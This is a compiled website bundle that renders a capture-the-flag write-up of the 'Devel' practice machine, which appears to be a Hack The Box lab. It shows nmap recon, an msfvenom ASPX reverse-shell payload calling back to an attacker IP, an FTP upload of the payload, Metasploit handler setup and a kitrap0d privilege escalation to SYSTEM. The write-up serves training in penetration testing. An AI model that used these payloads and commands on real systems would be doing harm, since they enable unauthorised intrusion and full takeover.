(window.webpackJsonp=window.webpackJsonp||[]).push([[73],{414:function(e,t,s){"use strict";s.r(t);var a=s(13),n=Object(a.a)({},(function(){var e=this,t=e._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"devel"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#devel"}},[e._v("#")]),e._v(" Devel")]),e._v(" "),t("p",[e._v("IP: "),t("code",[e._v("10.10.10.5")])]),e._v(" "),t("h2",{attrs:{id:"initial-recon"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#initial-recon"}},[e._v("#")]),e._v(" Initial recon")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-A")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-T5")]),e._v(" -p- "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".10.5\n")])])]),t("p",[e._v("results")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 01:22 EDT\nNmap scan report for 10.10.10.5\nHost is up (0.082s latency).\nNot shown: 65533 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 03-18-17  01:06AM       <DIR>          aspnet_client\n| 03-19-20  01:23PM                30442 dog.jpg\n| 03-19-20  02:00PM                 2852 ex.aspx\n| 03-17-17  04:37PM                  689 iisstart.htm\n|_03-17-17  04:37PM               184946 welcome.png\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: IIS7\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows Vista|2008|7|Phone|8.1|2012 (91%)\nOS CPE: cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2\nAggressive OS guesses: Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT      ADDRESS\n1   86.30 ms 10.10.14.1\n2   87.06 ms 10.10.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 125.91 seconds\n")])])]),t("h2",{attrs:{id:"interpretation-of-results"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#interpretation-of-results"}},[e._v("#")]),e._v(" Interpretation of results")]),e._v(" "),t("p",[e._v("Seems like there is a FTP where I can put files on. Additionally, there is a frontend on port "),t("code",[e._v("80")]),e._v(" where I can arbitrarily execute files. This may be a reverse shell exploit.")]),e._v(" "),t("p",[e._v("Navigating to this webside, we see that this is an ASP.net web site. So we will generate the according payload for this machine.")]),e._v(" "),t("h2",{attrs:{id:"generating-the-payload"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#generating-the-payload"}},[e._v("#")]),e._v(" Generating the payload")]),e._v(" "),t("p",[e._v("From this msfvenom cheat sheet: https://netsec.ws/?p=331, we will use the aspx payload command.")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("msfvenom "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-p")]),e._v(" windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".14.10 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("4444")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-f")]),e._v(" aspx "),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" shell.aspx\n")])])]),t("p",[t("strong",[e._v("Important note")]),e._v("!: Make sure to use the "),t("code",[e._v("tun0")]),e._v(" inet IP from "),t("code",[e._v("ifconfig")]),e._v(" instead of the "),t("code",[e._v("eth0")])]),e._v(" "),t("h2",{attrs:{id:"setting-up-the-listener-for-reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#setting-up-the-listener-for-reverse-shell"}},[e._v("#")]),e._v(" Setting up the listener for reverse shell")]),e._v(" "),t("p",[e._v("In a new tab, we are going to run the exploit handler to listen on a port")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("msfconsole\nuse exploit/multi/handler\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" payload windows/meterpreter/reverse_tcp\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" lhost "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".14.10\n")])])]),t("h2",{attrs:{id:"putting-payload-onto-the-server"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#putting-payload-onto-the-server"}},[e._v("#")]),e._v(" Putting payload onto the server")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[e._v("ftp")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".10.5\nftp"),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" put shell.aspx\n")])])]),t("h2",{attrs:{id:"running-the-reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#running-the-reverse-shell"}},[e._v("#")]),e._v(" Running the reverse shell")]),e._v(" "),t("p",[e._v("Navigate to the website URL "),t("code",[e._v("http://10.10.10.5/shell.aspx")]),e._v("\nAnd boom! We have a meterpreter shell.")]),e._v(" "),t("h2",{attrs:{id:"reverse-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#reverse-shell"}},[e._v("#")]),e._v(" Reverse shell")]),e._v(" "),t("p",[e._v("After getting the reverse shell, running a quick "),t("code",[e._v("getuid")]),e._v(" gives back a non-root user.")]),e._v(" "),t("p",[e._v("Trying to elevate:")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("getsystem\n")])])]),t("p",[e._v("annd it doesn't work.")]),e._v(" "),t("h2",{attrs:{id:"post-explotation"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#post-explotation"}},[e._v("#")]),e._v(" Post explotation")]),e._v(" "),t("p",[e._v("Let's try to elevate to root\nFirst, background the meterpreter shell")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("background "),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# background the meterpreter")]),e._v("\n")])])]),t("p",[e._v("Let's see if there are any suggestions for exploits")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("search suggester\nuse post/multi/recon/local_exploit_suggester\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" session "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# the session ID of our meterpreter shell")]),e._v("\nrun\n")])])]),t("p",[e._v("The possible exploit suggestions:")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("[*] 10.10.10.5 - Collecting local exploits for x86/windows...\n[*] 10.10.10.5 - 29 exploit checks are being tried...\n[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.\n[*] Post module execution completed\n")])])]),t("h2",{attrs:{id:"root-privelege-elevation"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#root-privelege-elevation"}},[e._v("#")]),e._v(" Root privelege elevation")]),e._v(" "),t("p",[e._v("Let's try the kitrap0d one")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("use exploit/windows/local/ms10_015_kitrap0d\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" session "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),e._v("\n")])])]),t("p",[e._v("and it returns")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("[*] Started reverse TCP handler on 10.0.2.15:4444 \n[*] Launching notepad to host the exploit...\n[+] Process 336 launched.\n[*] Reflectively injecting the exploit DLL into 336...\n[*] Injecting exploit into 336 ...\n[*] Exploit injected. Injecting payload into 336...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Exploit completed, but no session was created.\n")])])]),t("p",[e._v("but no session was created! WHY?")]),e._v(" "),t("p",[e._v("This is because the lhost defaulted to our "),t("code",[e._v("eth0")]),e._v(" interface, which is incorrect. It should be on the "),t("code",[e._v("tun0")]),e._v(" interface.")]),e._v(" "),t("p",[e._v("So we need to set the lhost again")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" lhost "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.10")]),e._v(".14.10\nrun\n")])])]),t("p",[e._v("And now we finally have a root meterpreter shell")]),e._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[e._v("getuid\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# NT AUTHORITY\\SYSTEM")]),e._v("\n")])])]),t("p",[e._v("Get the flags and we are done")]),e._v(" "),t("h2",{attrs:{id:"takeaways"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#takeaways"}},[e._v("#")]),e._v(" Takeaways")]),e._v(" "),t("ol",[t("li",[e._v("There may be multiple stages to an exploit, not just running a script.")]),e._v(" "),t("li",[e._v("Knowing the background on a web framework can be helpful.")]),e._v(" "),t("li",[e._v("Reverse shells can be tricky.")])])])}),[],!1,null,null,null);t.default=n.exports}}]);